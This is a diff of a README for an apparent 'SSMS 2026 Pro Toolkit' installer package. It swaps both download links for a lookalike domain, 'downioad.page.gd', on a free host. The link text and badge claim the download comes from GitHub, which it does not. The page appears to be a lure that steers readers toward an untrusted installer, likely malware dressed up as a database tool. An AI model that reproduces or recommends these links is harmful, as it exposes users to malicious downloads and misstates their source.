@@ -2,7 +2,7 @@
 
 The **SQL Server Management Studio 2026 Pro Toolkit** is a comprehensive Windows desktop enhancement package designed to elevate the standard SSMS experience. This toolkit integrates a curated set of powerful add-ons and configuration utilities, focusing on boosting developer productivity and streamlining complex database administration workflows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Included
 
@@ -48,7 +48,7 @@ A:** This toolkit is designed for individual productivity on developer or admini
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
